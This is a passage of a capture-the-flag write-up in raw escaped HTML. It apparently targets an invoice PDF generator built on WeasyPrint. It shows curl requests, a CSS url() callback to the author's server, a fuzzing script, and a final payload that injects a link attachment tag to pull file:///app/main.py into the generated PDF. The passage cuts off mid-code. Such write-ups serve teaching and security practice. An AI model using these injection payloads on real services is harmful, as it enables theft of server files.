class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026amp;#\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003echarCodeAt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e#iframe-box\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eempty\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e#iframe-box\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eappend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026lt;iframe width=\u0026quot;100%\u0026quot; height=\u0026quot;500px\u0026quot; src=\u0026quot;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003eurl\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003esavePDF\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ep\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eencodeInvoice\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eurl\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ehttp://\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nb\"\u003ewindow\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elocation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehostname\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e/invoices/pdfize?d=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nb\"\u003eencodeURIComponent\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003eurl\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"sr\"\u003e/\u003c/span\u003e\u003cspan class=\"se\"\u003e[\\u\u003c/span\u003e\u003cspan class=\"sr\"\u003e00A0-\u003c/span\u003e\u003cspan class=\"se\"\u003e\\u\u003c/span\u003e\u003cspan class=\"sr\"\u003e9999\u0026lt;\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026amp;]\u003c/span\u003e\u003cspan class=\"sr\"\u003e/gim\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026amp;#\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003echarCodeAt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ea\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026lt;a download href=\u0026quot;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003eurl\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;\u0026gt;\u0026lt;span\u0026gt;\u0026lt;i\u0026gt;If your download does not start, click here\u0026lt;/i\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/a\u0026gt;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e#iframe-box\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eappend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003efind\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003espan\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003etrigger\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eclick\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eUsing \u003ccode\u003e/invoice/preview\u003c/code\u003e we get a html page with our invoice and using \u003ccode\u003e/invoice/pdfize\u003c/code\u003e we get a PDF with the same content. Analyzing the rest of the code I was able to send a valid request to both endpoints using curl:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003ecurl \u003cspan class=\"nt\"\u003e-gv\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;http://localhost:81/invoices/preview?d={\u0026quot;companyName\u0026quot;:\u0026quot;Hackerone\u0026quot;,\u0026quot;email\u0026quot;:\u0026quot;aaa@hackerone.com\u0026quot;,\u0026quot;invoiceNumber\u0026quot;:\u0026quot;1\u0026quot;,\u0026quot;date\u0026quot;:\u0026quot;2019-03-08\u0026quot;,\u0026quot;items\u0026quot;:[[\u0026quot;1\u0026quot;,\u0026quot;manoelt\u0026quot;,\u0026quot;manoelt\u0026quot;,\u0026quot;2\u0026quot;],[\u0026quot;1\u0026quot;,\u0026quot;manoelt\u0026quot;,\u0026quot;manoelt\u0026quot;,\u0026quot;2\u0026quot;],[\u0026quot;1\u0026quot;,\u0026quot;manoelt\u0026quot;,\u0026quot;manoelt\u0026quot;,\u0026quot;2\u0026quot;]],\u0026quot;styles\u0026quot;:{\u0026quot;body\u0026quot;:{\u0026quot;background-color\u0026quot;:\u0026quot;white\u0026quot;}}}\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\ncurl \u003cspan class=\"nt\"\u003e-gv\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;http://localhost:81/invoices/pdfize?d={\u0026quot;companyName\u0026quot;:\u0026quot;Hackerone\u0026quot;,\u0026quot;email\u0026quot;:\u0026quot;aaa@hackerone.com\u0026quot;,\u0026quot;invoiceNumber\u0026quot;:\u0026quot;1\u0026quot;,\u0026quot;date\u0026quot;:\u0026quot;2019-03-08\u0026quot;,\u0026quot;items\u0026quot;:[[\u0026quot;1\u0026quot;,\u0026quot;manoelt\u0026quot;,\u0026quot;manoelt\u0026quot;,\u0026quot;22222\u0026quot;,\u0026quot;2\u0026quot;],[\u0026quot;1\u0026quot;,\u0026quot;manoelt\u0026quot;,\u0026quot;manoelt\u0026quot;,\u0026quot;2\u0026quot;],[\u0026quot;1\u0026quot;,\u0026quot;manoelt\u0026quot;,\u0026quot;manoelt\u0026quot;,\u0026quot;2\u0026quot;]],\u0026quot;styles\u0026quot;:{\u0026quot;body\u0026quot;:{\u0026quot;background-color\u0026quot;:\u0026quot;white\u0026quot;}}}\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-o\u003c/span\u003e invoice.pdf\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOne of the first things that I try when attacking a python web application is Server Side Template Injection. Although we have several input options on the json above, none gave me a SSTI using \u003ccode\u003e{{7*7}}\u003c/code\u003e as payload. Also, what catches our attention is the permission to define styles for the web page, as we already know that using css we could leak information of a web page [17], but it does not seem to be useful here. But we could get some more recon information if we were able to trigger a HTTP request using \u003ccode\u003eurl()\u003c/code\u003e: \u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003e...\u0026quot;styles\u0026quot;:{\u0026quot;body\u0026quot;:{\u0026quot;background-image\u0026quot;:\u0026quot;url(\u0026#39;http://myserver.com.br/\u0026#39;)\u0026quot;...\u003c/code\u003e. \u003c/p\u003e\n\n\u003cp\u003eAnd I got a request on my server with this header: \u003ccode\u003eUser-Agent: WeasyPrint 44 (http://weasyprint.org/)\u003c/code\u003e.\u003c/p\u003e\n\n\u003ch3 id=\"weasyprint\"\u003eWeasyPrint\u003c/h3\u003e\n\n\u003cp\u003eWhat is WeasyPrint? From \u003ca title=\"https://github.com/Kozea/WeasyPrint/\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FKozea%2FWeasyPrint%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/Kozea/WeasyPrint/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e : \u003cem\u003eWeasyPrint is a smart solution helping web developers to create PDF documents. It turns simple HTML pages into gorgeous statistical reports, invoices, tickets…\u003c/em\u003e. Ok, time to understand more this python library. \u003c/p\u003e\n\n\u003cp\u003eReading the docs I saw this: \u003cem\u003eWhen used with untrusted HTML or untrusted CSS, WeasyPrint can meet security problems. You will need extra configuration in your Python application to avoid high memory use, endless renderings or local files leaks.\u003c/em\u003e. Nice! All we need to know now is how to exploit this flaw. Maybe someone opened an issue on github? It was not the case. But, I found this pull request:\u003c/p\u003e\n\n\u003cp\u003e\u0026quot;Added support for PDF attachments.\u0026quot; (\u003ca title=\"https://github.com/Kozea/WeasyPrint/pull/177\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FKozea%2FWeasyPrint%2Fpull%2F177\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/Kozea/WeasyPrint/pull/177\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e).\u003c/p\u003e\n\n\u003cp\u003eWhat an amazing feature! So, using \u003ccode\u003e\u0026lt;link rel=\u0026#39;attachment\u0026#39; href=\u0026#39;file_path\u0026#39;\u0026gt;\u003c/code\u003e WeasyPrint will attach the file from href location to the PDF. I am sure that it is all we need.\u003c/p\u003e\n\n\u003cp\u003eLet\u0026#39;s test all json attributes to inject HTML code. Nothing better than creating a python script to help us:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"o\"\u003e...\u003c/span\u003e\n\u003cspan class=\"n\"\u003eURL\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;http://localhost:81/invoices/\u0026#39;\u003c/span\u003e\n\u003cspan class=\"o\"\u003e...\u003c/span\u003e\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003epdfize\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epayl\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003efilename\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"n\"\u003er\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003erequests\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eURL\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"n\"\u003ePDFIZE\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eparams\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ewith\u003c/span\u003e \u003cspan class=\"nb\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;invoices/\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"n\"\u003efilename\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;wb\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003eas\u003c/span\u003e \u003cspan class=\"n\"\u003efd\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003echunk\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eiter_content\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003echunk_size\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"mi\"\u003e128\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n            \u003cspan class=\"n\"\u003efd\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003echunk\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003epreview\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epayl\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"n\"\u003er\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003erequests\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eURL\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"n\"\u003ePREVIEW\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eparams\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003econtent\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003einvoice\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;companyName\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026lt;/style\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;email\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026lt;/style\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;invoiceNumber\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;1\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;date\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026lt;html\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u0026lt;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026gt;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;items\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:[[\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;1\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;manoelt\u0026lt;script\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;manoelt\u0026lt;/script\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;2\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e],[\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;1\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;manoelt\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;manoelt\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;2\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e]],\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;styles\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:{\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;body\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:{\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;}\u0026lt;/style background-color\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;white\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e}}}\u003c/span\u003e\n\u003cspan class=\"n\"\u003epayload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;d\u0026quot;\u003c/span\u003e \u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003ejson\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edumps\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003einvoice\u003c/span\u003e\u003cspan class=\"p\"\u003e)}\u003c/span\u003e\n\u003cspan class=\"n\"\u003epdfize\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;style_invoice.pdf\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003epreview\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd through only one attribute I was able to inject HTML: CSS property! But the backend was not allowing \u003ccode\u003e\u0026gt;\u003c/code\u003e... And this tip from [18]: \u003ccode\u003eYou can use // to close a tag instead of \u0026gt;.\u003c/code\u003e made the final exploit:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\n\u003cspan class=\"n\"\u003einvoice\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;companyName\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;email\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;invoiceNumber\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;1\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;date\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;html\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u0026lt;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026gt;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;items\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:[[\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;1\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;manoelt\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;manoelt\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;2\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e],[\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;1\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;manoelt\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;manoelt\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;2\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e]],\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;styles\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:{\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;body\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:{\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;}\u0026lt;/style//\u0026lt;link rel=\u0026#39;attachment\u0026#39; href=\u0026#39;file:///app/main.py\u0026#39;\u0026gt;\u0026lt;style\u0026gt; body: {  background-color\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;white\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e}}}\u003c/span\u003e\n\u003cspan class=\"n\"\u003epayload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;d\u0026quot;\u003c/span\u003e \u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003ejson\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan 